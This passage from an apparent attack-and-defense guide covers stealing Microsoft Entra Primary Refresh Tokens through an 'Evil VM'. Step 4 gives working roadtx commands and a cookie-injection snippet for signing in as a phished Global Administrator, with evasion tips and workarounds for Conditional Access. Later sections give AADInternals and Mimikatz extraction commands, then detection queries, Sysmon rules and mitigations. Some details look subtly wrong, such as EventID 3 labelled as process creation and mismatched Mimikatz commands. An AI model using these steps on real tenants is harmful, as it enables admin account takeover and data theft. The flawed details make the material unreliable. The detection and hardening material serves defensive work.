- Use PRT sparingly to avoid detection
- Detection likelihood: Medium - Requires correlation of device cert origin with phished user identity

**Troubleshooting:**
- **Error:** "Device certificate validation failed"
  - **Cause:** Device cert is not valid, expired, or corrupted during export
  - **Fix:** Re-extract device cert from VM, ensure PFX file is not encrypted improperly
  - **Ref:** [Device Cert Validation Troubleshooting](https://dirkjanm.io/stealing-azure-ad-device-identities/)

- **Error:** "Transport key signature validation failed"
  - **Cause:** Transport key is corrupted or incorrect format
  - **Fix:** Verify transport key export from registry, try alternative export method
  - **Ref:** [AADInternals Transport Key Export](https://github.com/Gerenios/AADInternals)

- **Error:** "Refresh token is invalid or expired"
  - **Cause:** Refresh token was not successfully captured from phishing, or timeout occurred
  - **Fix:** Repeat phishing step, capture refresh token immediately after admin login
  - **Ref:** [ROADtools Token Capture](https://github.com/dirkjanm/ROADtools)

**References & Proofs:**
- [ROADtools prtenrich Command](https://github.com/dirkjanm/ROADtools)
- [Dirk-Jan Mollema - PRT Phishing Research](https://dirkjanm.io/phishing-for-microsoft-entra-primary-refresh-tokens/)
- [BeyondTrust Evil VM Research](https://www.beyondtrust.com/blog/entry/evil-vm)

---

#### Step 4: Authenticate as Phished User to Azure Portal, Microsoft 365, and Other Services

**Objective:** Use the stolen PRT to gain full access to all cloud services as the compromised admin.

**Command (Attacker's Machine - Use PRT):**
```powershell
# Method 1: Use PRT with browser (Edge/Chrome)
# PRT can be used in a browser via X-Ms-RefreshTokenCredential header or cookie injection

# Install PRT into browser using roadtx
roadtx browserprtauth -prt "path_to_prt_file" -c "device_cert.pfx" -k "device_transport_key.bin"

# Or manually inject PRT cookie:
# 1. Open Edge on attacker machine
# 2. Navigate to https://portal.azure.com
# 3. Open DevTools (F12) → Console
# 4. Inject PRT cookie: document.cookie = "X-Ms-RefreshTokenCredential=<PRT>"
# 5. Refresh page and should be authenticated as admin

# Method 2: Use access tokens for API calls
# PRT is used to request access tokens for specific services

$prt = Get-Content "C:\temp\prt.token" # Saved PRT from previous step

# Get access token for Azure Management API
roadtx token -prt $prt -r "https://management.azure.com/"

# Output: Access token that can be used with Azure CLI
# az account get-access-token --resource "https://management.azure.com/" --header "Authorization: Bearer <token>"

# Method 3: Sign in with stolen PRT (Most Stealthy)
# Some tools like ROADtools support direct authentication with PRT
roadtx browserprtauth -prt $prt

# This opens a browser and authenticates using the PRT
# Result: Attacker is now logged in as the phished admin
```

**Manual Steps (Attacker's Machine):**
1. On attacker machine, open Microsoft Edge or Chrome
2. Navigate to https://portal.azure.com
3. Open **Developer Tools** (F12)
4. Go to **Console** tab
5. Execute JavaScript to inject PRT cookie:
   ```javascript
   document.cookie = "X-MS-RefreshTokenCredential=<STOLEN_PRT>; Path=/; Secure; SameSite=None";
   ```
6. Refresh the page
7. If PRT is valid, should be authenticated as the compromised admin

**Expected Output:**
```
Authenticated as: john.admin@company.com (Global Administrator)
Access Level: Full Entra ID, Azure subscriptions, Microsoft 365
Capabilities: Create users, assign roles, access all data
```

**What This Means:**
- Attacker now has full administrative access to entire cloud environment
- Can create persistent backdoor accounts
- Can access all data in M365 services (SharePoint, Teams, Exchange)
- Can pivot to on-premises AD if configured in hybrid environment
- Access persists for 14+ days (PRT can be renewed)

**OpSec & Evasion:**
- Sign-in using PRT generates log entry in SignInLogs as "RefreshToken" type
- Attacker should be mindful of IP geolocation (VPN recommended)
- MFA is already satisfied, so no additional MFA prompts
- Conditional Access policies may block if they check device compliance (but device is marked as compliant via Azure)
- Detection likelihood: High - But requires correlation of unusual admin activities with new device/location

**Troubleshooting:**
- **Error:** "PRT is invalid or expired"
  - **Cause:** PRT was not properly captured, or sufficient time has passed
  - **Fix:** PRT is valid for 14 days with renewal; ensure within window. Otherwise repeat phishing.
  - **Ref:** [PRT Lifetime Management](https://learn.microsoft.com/en-us/entra/identity/devices/concept-primary-refresh-token)

- **Error:** "Conditional Access policy blocks sign-in"
  - **Cause:** Device compliance or location-based policy is blocking
  - **Fix:** The evil device should be marked as compliant (it's Azure-joined); if not, use different device identity or disable CA policy
  - **Ref:** [Conditional Access Device Compliance](https://learn.microsoft.com/en-us/entra/identity/conditional-access/concept-conditional-access-conditions)

- **Error:** "MFA required - cannot complete sign-in"
  - **Cause:** Conditional Access requires MFA even with PRT
  - **Fix:** PRT should satisfy MFA; if not, ensure PRT was acquired with fresh MFA. Otherwise, bypass is available via device identity bypass.
  - **Ref:** [PRT and MFA Interaction](https://dirkjanm.io/phishing-for-microsoft-entra-primary-refresh-tokens/)

**References & Proofs:**
- [ROADtools browserprtauth Command](https://github.com/dirkjanm/ROADtools)
- [Azure Portal Access using PRT](https://portal.azure.com)
- [BeyondTrust Evil VM - Accessing Azure Portal](https://www.beyondtrust.com/blog/entry/evil-vm)

---

## 6. ATTACK SIMULATION & VERIFICATION

#### Atomic Red Team

- **Atomic Test ID:** T1078.004-1 (Azure Cloud Accounts)
- **Test Name:** Create Service Principal with Credentials
- **Description:** Simulate creating additional credentials on a compromised cloud account to maintain persistence.
- **Supported Versions:** Azure all versions; Entra ID all versions
- **Command:**
  ```powershell
  Invoke-AtomicTest T1078.004 -TestNumbers 1
  ```
- **Cleanup Command:**
  ```powershell
  Invoke-AtomicTest T1078.004 -TestNumbers 1 -Cleanup
  ```

**Reference:** [Atomic Red Team - T1078.004](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1078.004/T1078.004.md)

---

## 7. TOOLS & COMMANDS REFERENCE

#### [AADInternals](https://github.com/Gerenios/AADInternals)

**Version:** 0.9.8+ (latest)
**Minimum Version:** 0.8.0
**Supported Platforms:** Windows PowerShell 5.0+, PowerShell 7.0+

**Version-Specific Notes:**
- Version 0.8.x: Basic device certificate export
- Version 0.9.x: Full PRT handling, device identity manipulation, token refresh
- Version 0.9.5+: Enhanced AAD Join simulation, transport key extraction

**Installation:**
```powershell
Install-Module AADInternals -Force -Scope CurrentUser
Import-Module AADInternals
Update-Module AADInternals -Force
```

**Usage (Export Device Certificate):**
```powershell
Export-AADIntLocalDeviceCertificate -Path "C:\temp\device.pfx"
Export-AADIntLocalDeviceTransportKey -Path "C:\temp\transport_key.bin"
```

---

#### [ROADtools](https://github.com/dirkjanm/ROADtools)

**Version:** 1.0.0+ (latest)
**Minimum Version:** 0.9.0
**Supported Platforms:** Linux, macOS, Windows with Python 3.7+

**Version-Specific Notes:**
- Version 0.9.x: Device code phishing, basic token handling
- Version 1.0.0+: Full PRT support, device identity impersonation, browser authentication

**Installation:**
```bash
pip install roadtools
# Or from GitHub:
git clone https://github.com/dirkjanm/ROADtools
cd ROADtools
pip install .
```

**Usage (Device Code Phishing):**
```bash
roadtx prtenrich --interactive
# Follow prompts to enter refresh token and device certificate
```

**Usage (PRT to Access Token):**
```bash
roadtx token -prt <path_to_prt> -r https://management.azure.com/
```

---

#### [Mimikatz](https://github.com/gentilkiwi/mimikatz)

**Version:** 2.2.0+ (latest)
**Minimum Version:** 2.1.0
**Supported Platforms:** Windows

**Version-Specific Notes:**
- Version 2.2.0+: PRT and device certificate extraction
- Version 2.1.x: Basic token dumping (limited PRT support)

**Installation:**
```cmd
# Download from releases page
# Or build from source
git clone https://github.com/gentilkiwi/mimikatz
cd mimikatz
cmake -B build && cmake --build build --config Release
```

**Usage (Extract PRT from Memory):**
```cmd
privilege::debug
token::list /csv
dpapi::cache
```

---

## 9. MICROSOFT SENTINEL DETECTION

#### Query 1: Guest Account Creating Azure VMs

**Rule Configuration:**
- **Required Table:** AzureActivity, AuditLogs
- **Required Fields:** Caller, ObjectId, OperationName, ResourceType
- **Alert Severity:** High
- **Frequency:** Run every 15 minutes
- **Applies To Versions:** All Entra ID tenants, all Azure subscriptions

**KQL Query:**
```kusto
// Detect guest accounts creating Gen 1 VMs without TPM
let guestUsers = AuditLogs
  | where OperationName == "Add user"
  | where tostring(InitiatedBy.user.userType) == "Guest"
  | project GuestObjectId = tostring(TargetResources[0].id), GuestUPN = tostring(InitiatedBy.user.userPrincipalName);

AzureActivity
  | where OperationName contains "Microsoft.Compute/virtualMachines/write"
  | where Caller in (guestUsers)
  | where Properties contains "gen1" or Properties contains "Standard" 
  | project TimeGenerated, Caller, OperationName, ResourceGroup, Subscription_s, Properties
```

**What This Detects:**
- Guest accounts in target tenant initiating VM creation
- Particularly sensitive if guest account was recently invited
- Filters for Gen 1 VMs (which lack TPM protection)
- Indicates potential Evil VM attack setup phase

**Manual Configuration Steps (Azure Portal):**
1. Navigate to **Azure Portal** → **Microsoft Sentinel**
2. Select your workspace → **Analytics** → **+ Create** → **Scheduled query rule**
3. **General Tab:**
   - Name: `Guest Account Creating Gen 1 VMs without TPM`
   - Severity: `High`
4. **Set rule logic Tab:**
   - Paste KQL query above
   - Run query every: `15 minutes`
   - Lookup data from the last: `2 hours`
5. **Incident settings Tab:**
   - Enable **Create incidents**
   - Group by: `Caller, ResourceGroup`
6. Click **Review + create**

---

#### Query 2: Device Certificate Extraction or AADInternals Usage

**Rule Configuration:**
- **Required Table:** SecurityEvent, DeviceEvents, ProcessCreation
- **Required Fields:** ParentImage, Image, CommandLine, Computer
- **Alert Severity:** Critical
- **Frequency:** Real-time or every 5 minutes
- **Applies To Versions:** Windows Server 2016+, Windows 10/11

**KQL Query:**
```kusto
// Detect AADInternals or credential dumping tools
union isfuzzy=true
(
  SecurityEvent
  | where EventID == 3 // Process creation
  | where (NewProcessName contains "powershell" or NewProcessName contains "pwsh")
  | where CommandLine contains "AADInternals" or CommandLine contains "Export-AADIntLocal"
        or CommandLine contains "Get-AADIntDevice" or CommandLine contains "Mimikatz"
),
(
  DeviceEvents
  | where ActionType == "ProcessCreated"
  | where FileName in ("powershell.exe", "pwsh.exe")
  | where ProcessCommandLine contains "AADInternals" or ProcessCommandLine contains "Export-AADIntLocal"
        or ProcessCommandLine contains "Mimikatz" or ProcessCommandLine contains "lsass"
)
| project TimeGenerated, Computer, FileName, ProcessCommandLine, InitiatingProcessAccountName
```

**What This Detects:**
- Execution of AADInternals or Mimikatz on Azure VMs or endpoints
- Particularly sensitive if run from Gen 1 VM or non-standard device
- Indicates credential/certificate dumping attempt
- Critical indicator of Evil VM attack in progress

**Manual Configuration Steps (Azure Portal):**
1. Navigate to **Microsoft Sentinel** → **Analytics** → **+ Create** → **Scheduled query rule**
2. **General Tab:**
   - Name: `Suspicious Credential Dumping Tool Execution`
   - Severity: `Critical`
3. **Set rule logic Tab:**
   - Paste KQL query above
   - Run query every: `5 minutes`
   - Lookup data from the last: `1 hour`
4. **Incident settings Tab:**
   - Enable **Create incidents**
   - Group by: `Computer, InitiatingProcessAccountName`
5. Click **Review + create**

---

#### Query 3: Guest-Owned Subscription Transfer or Creation

**Rule Configuration:**
- **Required Table:** AzureActivity, AuditLogs
- **Required Fields:** Caller, Properties, OperationName, Category
- **Alert Severity:** Critical
- **Frequency:** Every 30 minutes
- **Applies To Versions:** All Azure subscriptions

**KQL Query:**
```kusto
// Detect subscriptions transferred to or created by guest accounts
let recentGuests = AuditLogs
  | where OperationName == "Invite user" or OperationName == "Add user"
  | where tostring(InitiatedBy.user.userType) == "Guest"
  | project GuestUPN = tostring(TargetResources[0].userPrincipalName), TimeAdded = TimeGenerated;

AzureActivity
  | where OperationName contains "CreateSubscription" or OperationName contains "Transfer"
  | where Category == "Administrative"
  | where Caller in (recentGuests)
  | project TimeGenerated, Caller, OperationName, CorrelationId, Subscription_s
```

**What This Detects:**
- Guest accounts initiating subscription creation or transfers
- Particularly if guest was invited within last 24 hours
- Direct indicator of Evil VM attack setup phase
- Critical control point for preventing attack

**Manual Configuration Steps (Azure Portal):**
1. Navigate to **Microsoft Sentinel** → **Analytics** → **+ Create** → **Scheduled query rule**
2. **General Tab:**
   - Name: `Guest Account Creating or Transferring Subscriptions`
   - Severity: `Critical`
3. **Set rule logic Tab:**
   - Paste KQL query above
   - Run query every: `30 minutes`
   - Lookup data from the last: `7 days`
4. **Incident settings Tab:**
   - Enable **Create incidents**
   - Group by: `Caller`
5. Click **Review + create**

---

#### Query 4: Device Code Flow Phishing Detection

**Rule Configuration:**
- **Required Table:** SigninLogs, AzureActivity
- **Required Fields:** UserPrincipalName, ClientAppUsed, ResourceDisplayName, IPAddress
- **Alert Severity:** High
- **Frequency:** Real-time or every 5 minutes
- **Applies To Versions:** All Entra ID tenants

**KQL Query:**
```kusto
// Detect device code phishing attempts
// Signature: RefreshToken sign-in followed by access token request from different device
SigninLogs
| where AuthenticationMethodsUsed contains "refreshToken"
| where AppDisplayName contains "Device Registration Service" or AppDisplayName contains "Microsoft Authentication Broker"
| where Status.additionalDetails contains "MFA satisfied" or Status.additionalDetails contains "PRT"
| join kind=inner
(
  SigninLogs
  | where TimeGenerated > ago(30m)
  | where UserPrincipalName contains "@"
  | where ClientAppUsed != "Other clients" and ClientAppUsed != "Browser"
  | where ResourceDisplayName contains "Azure" or ResourceDisplayName contains "Office 365"
)
on UserPrincipalName
| where IPAddress_1 != IPAddress
| project TimeGenerated, UserPrincipalName, ClientAppUsed, AppDisplayName, IPAddress, ResourceDisplayName
```

**What This Detects:**
- Sign-in using refresh token with device code flow
- Followed by access token request from different device/location
- Indicators of PRT theft or phishing
- Particularly sensitive if phished user is admin

**Manual Configuration Steps (Azure Portal):**
1. Navigate to **Microsoft Sentinel** → **Analytics** → **+ Create** → **Scheduled query rule**
2. **General Tab:**
   - Name: `Possible Device Code Phishing Attack`
   - Severity: `High`
3. **Set rule logic Tab:**
   - Paste KQL query above
   - Run query every: `5 minutes`
   - Lookup data from the last: `2 hours`
4. **Incident settings Tab:**
   - Enable **Create incidents**
   - Group by: `UserPrincipalName`
5. Click **Review + create**

---

## 10. WINDOWS EVENT LOG MONITORING

**Event ID: 4688 (Process Creation)**
- **Log Source:** Security Event Log
- **Trigger:** PowerShell or cmd.exe executing AADInternals, Mimikatz, or credential dumping commands
- **Filter:** CommandLine contains "Export-AADInt", "Mimikatz", "privilege::debug", "token::"
- **Applies To Versions:** Windows Server 2016+

**Manual Configuration Steps (Group Policy):**
1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration** → **System Audit Policies**
3. Enable: **Audit Process Creation** → **Success and Failure**
4. Expand and enable: **Detailed Tracking** → **Process Creation**
5. Set to: **Success and Failure**
6. Run `gpupdate /force` on all target machines

**Manual Configuration Steps (Local Policy - Server 2022+):**
1. Open **Local Security Policy** (secpol.msc)
2. Navigate to **Security Settings** → **Advanced Audit Policy Configuration** → **System Audit Policies** → **Detailed Tracking**
3. Enable: **Audit Process Creation**
4. Set to: **Success and Failure**
5. Run `auditpol /set /subcategory:"Process Creation" /success:enable /failure:enable`

**Manual Configuration Steps (PowerShell):**
```powershell
# Enable process creation audit
auditpol /set /subcategory:"Process Creation" /success:enable /failure:enable

# Verify
auditpol /get /subcategory:"Process Creation"
```

---

**Event ID: 5156 (Network Connection Blocked/Allowed)**
- **Log Source:** Security Event Log
- **Trigger:** Process establishing outbound connection to Azure endpoints (management.azure.com, graph.microsoft.com, login.microsoftonline.com)
- **Filter:** Application contains "powershell", "roadtx", "python", Destination Port in (443, 80)
- **Applies To Versions:** Windows Server 2016+

**Manual Configuration Steps:**
1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Windows Defender Firewall with Advanced Security**
3. Click **Monitoring** → **Firewall** → Enable logging
4. Enable: **Log successful connections**
5. Set log file location and size
6. Click **OK**

---

## 11. SYSMON DETECTION PATTERNS

**Minimum Sysmon Version:** 13.0+
**Supported Platforms:** Windows Server 2016+, Windows 10/11

```xml
<!-- Sysmon Configuration for Evil VM Detection -->
<Sysmon schemaversion="4.82">
  <!-- Detect AADInternals and Mimikatz execution -->
  <RuleGroup name="Detect-CredDump" groupRelation="or">
    <ProcessCreate onmatch="include">
      <Image condition="contains">powershell</Image>
      <CommandLine condition="contains">AADInternals</CommandLine>
    </ProcessCreate>
    <ProcessCreate onmatch="include">
      <Image condition="contains">powershell</Image>
      <CommandLine condition="contains">Export-AADIntLocal</CommandLine>
    </ProcessCreate>
    <ProcessCreate onmatch="include">
      <Image condition="contains">cmd</Image>
      <CommandLine condition="contains">mimikatz</CommandLine>
    </ProcessCreate>
  </RuleGroup>

  <!-- Detect registry access to device certificates -->
  <RuleGroup name="Detect-DeviceCertRegAccess" groupRelation="or">
    <RegistryEvent onmatch="include">
      <TargetObject condition="contains">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\CDPSvc</TargetObject>
      <EventType>SetValue</EventType>
    </RegistryEvent>
  </RuleGroup>

  <!-- Detect network connections to Azure/Entra endpoints -->
  <RuleGroup name="Detect-AzureConnections" groupRelation="or">
    <NetworkConnect onmatch="include">
      <DestinationHostname condition="contains">management.azure.com</DestinationHostname>
      <DestinationPort condition="is">443</DestinationPort>
    </NetworkConnect>
    <NetworkConnect onmatch="include">
      <DestinationHostname condition="contains">graph.microsoft.com</DestinationHostname>
      <DestinationPort condition="is">443</DestinationPort>
    </NetworkConnect>
  </RuleGroup>
</Sysmon>
```

**Manual Configuration Steps:**
1. Download Sysmon from [Microsoft Sysinternals](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon)
2. Create a config file `sysmon-config.xml` with the XML above
3. Install Sysmon with the config:
   ```cmd
   sysmon64.exe -accepteula -i sysmon-config.xml
   ```
4. Verify installation:
   ```powershell
   Get-Service Sysmon64
   Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 10
   ```

---

## 12. MICROSOFT DEFENDER FOR CLOUD

#### Detection Alerts

**Alert Name:** "Suspicious role assignment detected"
- **Severity:** High
- **Description:** MDC detects when a guest account is assigned a high-privilege Azure role (Owner, Contributor) within a short time of being invited
- **Applies To:** All Azure subscriptions with Defender for Cloud enabled
- **Remediation:** Review guest account identity, verify business justification for role assignment, immediately remove guest if unauthorized, review other role assignments by this guest

**Alert Name:** "Gen 1 Virtual Machine Created Without Disk Encryption"
- **Severity:** High
- **Description:** MDC detects creation of Gen 1 VMs without TPM (security type Standard) which lack hardware-based credential protection
- **Applies To:** All Azure subscriptions
- **Remediation:** Enforce Azure Policy to block Gen 1 VM creation, use Gen 2 with TrustedLaunch only

**Alert Name:** "Subscription Directory Changed"
- **Severity:** Medium
- **Description:** MDC alerts when subscription is transferred between directories or tenants
- **Applies To:** All Azure subscriptions
- **Remediation:** Verify business justification, confirm subscription recipient identity, audit who initiated transfer

**Manual Configuration Steps (Enable Defender for Cloud):**
1. Navigate to **Azure Portal** → **Microsoft Defender for Cloud**
2. Go to **Environment settings** in left menu
3. Select your **subscription**
4. Under **Defender plans**, toggle ON:
   - **Defender for Servers**: ON (detects process creation and suspicious activities)
   - **Defender for Resource Manager**: ON (detects suspicious Azure API calls)
   - **Defender for Cloud Apps**: ON (detects suspicious M365 activities)
5. Scroll down and ensure **Alert notifications** are configured
6. Click **Save**
7. Go to **Security alerts** to view triggered alerts

**Manual Configuration Steps (Create Custom Alert):**
1. Navigate to **Defender for Cloud** → **Security alerts**
2. Click **Create custom alert rule**
3. Define rule:
   - **Condition:** Resource type == "Microsoft.Compute/virtualMachines", SecurityType == "Standard"
   - **Action:** Alert with severity "High"
4. Click **Create**

---

## 13. MICROSOFT PURVIEW (UNIFIED AUDIT LOG)

#### Query: Guest Account Invitation and Subscription Ownership Changes

```powershell
Search-UnifiedAuditLog -Operations "Invite user","Confirm invited user","Add user to group","Assign role" `
    -UserType Guest -StartDate (Get-Date).AddDays(-30) -EndDate (Get-Date)
```

- **Operation:** Invite user, Confirm invited user, Add user to group, Assign role
- **Workload:** Azure Active Directory, AzureActiveDirectory
- **Details:** Filter for guest accounts with UserType == "Guest" and EventType contains "Assignment"
- **Applies To:** M365 E3+ with Entra ID audit enabled

**Manual Configuration Steps (Enable Unified Audit Log):**
1. Navigate to **Microsoft Purview Compliance Portal** (compliance.microsoft.com)
2. Go to **Audit** (left menu)
3. If not enabled, click **Turn on auditing** (this may take up to 24 hours to activate)
4. Wait 24 hours for log retention to activate

**Manual Configuration Steps (Search Audit Logs):**
1. Go to **Audit** → **Search**
2. Set **Date range:** Last 30 days
3. Under **Activities**, select: **Invite user**, **Add user to role**
4. Under **Users**, enter: leave blank (to search all users)
5. Click **Search**
6. Review results for guests being invited and assigned roles
7. Export results: **Export** → **Download all results**

**PowerShell Alternative (Continuous Monitoring):**
```powershell
# Connect to Exchange Online
Connect-ExchangeOnline

# Search for guest invitations in last 7 days
$auditLogs = Search-UnifiedAuditLog -Operations "Invite user" -StartDate (Get-Date).AddDays(-7) -EndDate (Get-Date)

# Export to CSV
$auditLogs | Export-Csv -Path "C:\Audit\guest_invitations.csv" -NoTypeInformation

# Alert on high volume of guest invitations (> 10 in 24 hours)
if ($auditLogs.Count -gt 10) {
    Write-Warning "Unusual number of guest invitations detected: $($auditLogs.Count)"
}
```

---

## 14. DEFENSIVE MITIGATIONS

#### Priority 1: CRITICAL - Restrict Guest Account Permissions

*   **Action 1: Disable Guest Invitation Rights**
    
    **Applies To Versions:** All Entra ID tenants
    
    **Manual Steps (Azure Portal):**
    1. Go to **Azure Portal** → **Entra ID** → **External Identities** → **External Collaboration Settings**
    2. Under "Guest invite restrictions", select: **Only users assigned the "Guest Inviter" role can invite guests**
    3. Click **Save**
    
    **Manual Steps (PowerShell):**
    ```powershell
    Connect-MgGraph -Scopes "Directory.ReadWrite.All"
    
    Update-MgPolicyAuthorizationPolicy -GuestUserRoleId "10dae51f-b6af-4016-8d66-8c2a99b929b3" `
        -AllowInvitesFrom "adminsAndGuestInviters" `
        -AllowUserConsentForRiskyApps $false
    ```
    
    **Verification Command:**
    ```powershell
    Get-MgPolicyAuthorizationPolicy | Select-Object AllowInvitesFrom, GuestUserRoleId
    ```
    
    **Expected Output (If Secure):**
    ```
    AllowInvitesFrom: adminsAndGuestInviters
    GuestUserRoleId: 10dae51f-b6af-4016-8d66-8c2a99b929b3
    ```

*   **Action 2: Restrict Subscription Transfer to Directory**
    
    **Applies To Versions:** All Azure subscriptions
    
    **Manual Steps (Azure Portal):**
    1. Go to **Azure Portal** → **Cost Management + Billing** → **Policies**
    2. Under "Subscription Transfer", select: **Transfers between subscriptions are disabled**
    3. Alternatively, create **Azure Policy** at root management group level:
       - Create policy: "Deny subscription directory change"
       - Effect: Deny
       - Condition: Action == "Microsoft.Subscription/subscriptions/changeTenant"
    4. Click **Save**
    
    **Manual Steps (PowerShell - Azure Policy):**
    ```powershell
    # Create policy to block subscription transfers
    $policyDefinition = @{
        name       = "DenySubscriptionTransfer"
        properties = @{
            description = "Deny transfers of subscriptions between directories"
            mode        = "All"
            policyRule  = @{
                if   = @{
                    allOf = @(
                        @{
                            field  = "type"
                            equals = "Microsoft.Subscription/subscriptions/changeTenant/action"
                        }
                    )
                }
                then = @{
                    effect = "Deny"
                }
            }
        }
    }
    
    # Apply at root management group
    New-AzPolicyDefinition -Name "DenySubscriptionTransfer" -Policy ($policyDefinition.properties | ConvertTo-Json)
    New-AzPolicyAssignment -Name "DenySubscriptionTransfer" -PolicyDefinition $policyDefinition -Scope "/subscriptions/*"
    ```
    
    **Verification Command:**
    ```powershell
    Get-AzPolicyAssignment | Where-Object {$_.Name -contains "DenySubscription"}
    ```

*   **Action 3: Block Gen 1 VM Creation - Enforce Gen 2 Only**
    
    **Applies To Versions:** All Azure subscriptions
    
    **Manual Steps (Azure Policy - Root Management Group):**
    1. Go to **Azure Portal** → **Policy** → **Definitions** → **+ Policy Definition**
    2. Name: `Enforce Generation 2 Virtual Machines`
    3. **Policy Rule:**
       ```json
       {
         "mode": "All",
         "policyRule": {
           "if": {
             "allOf": [
               {
                 "field": "type",
                 "equals": "Microsoft.Compute/virtualMachines"
               },
               {
                 "field": "Microsoft.Compute/virtualMachines/storageProfile.osDisk.managedDisk.id",
                 "exists": "true"
               },
               {
                 "not": {
                   "field": "Microsoft.Compute/virtualMachines/storageProfile.imageReference.id",
                   "contains": "gen2"
                 }
               }
             ]
           },
           "then": {
             "effect": "Deny"
           }
         }
       }
       ```
    4. Click **Save**
    5. Assign policy to root management group (scope all subscriptions)
    6. Set enforcement: **Enabled**
    
    **Manual Steps (PowerShell):**
    ```powershell
    # Create policy definition
    $policy = @{
        DisplayName = "Enforce Generation 2 Virtual Machines"
        PolicyRule  = @{
            if   = @{
                allOf = @(
                    @{ field = "type"; equals = "Microsoft.Compute/virtualMachines" },
                    @{ not = @{ field = "Microsoft.Compute/virtualMachines/storageProfile.imageReference.id"; contains = "gen2" } }
                )
            }
            then = @{ effect = "Deny" }
        }
    }
    
    New-AzPolicyDefinition -Name "EnforceGen2VMs" -DisplayName "Enforce Gen 2 VMs" -Policy ($policy | ConvertTo-Json -Depth 10)
    
    # Assign to root management group (affects all subscriptions)
    New-AzPolicyAssignment -Name "EnforceGen2VMs" -DisplayName "Enforce Gen 2 VMs" `
        -Scope "/subscriptions/*" -PolicyDefinition $policy
    ```
    
    **Verification Command:**
    ```powershell
    # Try to create Gen 1 VM - should fail with policy error
    New-AzVM -ResourceGroupName "test-rg" -Name "test-vm" -Image "UbuntuLTS"
    # Expected: Error from Azure Policy - "Disallowed by policy"
    ```

*   **Action 4: Enable Conditional Access to Block Unmanaged Devices**
    
    **Manual Steps (Azure Portal):**
    1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
    2. Click **+ New policy**
    3. Name: `Block Azure Admin Access from Unmanaged Devices`
    4. **Assignments:**
       - Users or workload identities: **All users** (focus on admins first)
       - Cloud apps or actions: **Microsoft Azure Management** (Azure Portal, ARM, CLI)
    5. **Conditions:**
       - Device platforms: **Windows, macOS, iOS, Android**
       - Device state: **Device hybrid Azure AD joined** OR **Device marked as compliant**
    6. **Access controls:**
       - Grant: **Require all of the following:**
         - Require device to be marked as compliant
         - Require Entra ID hybrid joined device
    7. Enable policy: **On**
    8. Click **Create**
    
    **PowerShell Alternative:**
    ```powershell
    # Create Conditional Access policy via Graph API
    Connect-MgGraph -Scopes "Policy.ReadWrite.ConditionalAccess"
    
    $params = @{
        displayName = "Block Azure Admin Access from Unmanaged Devices"
        state       = "enabled"
        conditions  = @{
            applications = @{
                includeApplications = @("797f4846-ba00-4fd7-ba43-dac1f8f63013") # Azure Management API
            }
            users = @{
                includeUsers = @("All")
            }
            deviceStates = @{
                excludeDeviceStates = @("Compliant")
            }
        }
        grantControls = @{
            operator         = "AND"
            builtInControls  = @("compliantDevice", "hybridAzureADJoinedDevice")
        }
    }
    
    New-MgIdentityConditionalAccessPolicy -BodyParameter $params
    ```

#### Priority 2: HIGH - Monitor Guest Activity and Device Changes

*   **Action: Enable Audit Logging for Guest Invitations and Role Assignments**
    
    **Manual Steps (Azure Portal):**
    1. Go to **Azure Portal** → **Entra ID** → **Audit logs** → **Settings**
    2. Ensure **Audit logs retention** is set to **90 days** minimum (max 365 days)
    3. Navigate to **Entra ID** → **Users** → **Guest users**
    4. Enable **User invite settings** monitoring
    5. Create alert rule: "Guest user added" → Alert Severity: High
    
    **PowerShell Setup:**
    ```powershell
    # Enable auditing for guest operations
    Connect-ExchangeOnline
    Set-OrganizationConfig -AuditDisabled $false
    ```

*   **Action: Implement Device Compliance Policy to Enforce TPM**
    
    **Manual Steps (Intune - If Org Uses):**
    1. Go to **Azure Portal** → **Intune** → **Device Compliance** → **Policies**
    2. Create new compliance policy:
       - Name: `Enforce TPM and Secure Boot`
       - Platform: Windows 10/11
       - Configuration: **Require TPM 2.0**
       - Configuration: **Require Secure Boot**
    3. Assign policy to **All users** or **All devices**
    4. Non-compliant devices: Mark as **Noncompliant** (blocks access to resources)

#### Access Control & Policy Hardening

*   **Conditional Access: Require MFA for All Guest Sign-Ins**
    
    **Manual Steps (Azure Portal):**
    1. Go to **Entra ID** → **Security** → **Conditional Access**
    2. Click **+ New policy**
    3. Name: `Require MFA for Guests`
    4. **Assignments:**
       - User type: **Guests**
       - Cloud apps: **All cloud apps**
    5. **Access controls:**
       - Grant: **Require multifactor authentication**
    6. Click **Create**

*   **RBAC: Remove Global Admin from Non-Privileged Accounts**
    
    **Manual Steps (Azure Portal):**
    1. Go to **Entra ID** → **Roles and administrators**
    2. Click **Global Administrator**
    3. Review all assigned members
    4. For each non-essential admin, click member name
    5. Click **Remove assignment**
    6. Repeat for **Privileged Role Administrator**
    
    **PowerShell Alternative:**
    ```powershell
    # Remove Global Admin role from specific user
    $userId = (Get-MgUser -Filter "mail eq 'unnecessary.admin@company.com'").Id
    Remove-MgDirectoryRoleMember -DirectoryRoleId "62e90394-69f5-4237-9190-012177145e10" -DirectoryObjectId $userId
    ```

*   **Policy Config: Disable Device Registration for Non-Admins**
    
    **Manual Steps (Azure Portal):**
    1. Go to **Entra ID** → **Devices** → **Device settings**
    2. Under "Users may register devices", select: **None**
    3. Under "Users may join devices to Azure AD", select: **Selected** or **None**
    4. If selected, choose specific groups of authorized admins/users
    5. Click **Save**
    
    **PowerShell:**
    ```powershell
    Update-MgDeviceRegistrationPolicy -UserExperienceSettings @{
        IsScheduledDeleteEnabled = $true
        DeleteDevicesOlderThanDays = 30
    }
    ```

#### Validation Command (Verify Fixes Are Active)

```powershell
# Check that mitigations are in place
Connect-MgGraph -Scopes "Directory.Read.All", "Policy.Read.All"

# 1. Verify guest invitation restrictions
Write-Host "=== Guest Invitation Restrictions ==="
(Get-MgPolicyAuthorizationPolicy).AllowInvitesFrom

# 2. Verify device registration restrictions
Write-Host "=== Device Registration Restrictions ==="
Get-MgDeviceRegistrationPolicy | Select-Object -ExpandProperty UserExperienceSettings

# 3. Verify Conditional Access policies exist
Write-Host "=== Active Conditional Access Policies ==="
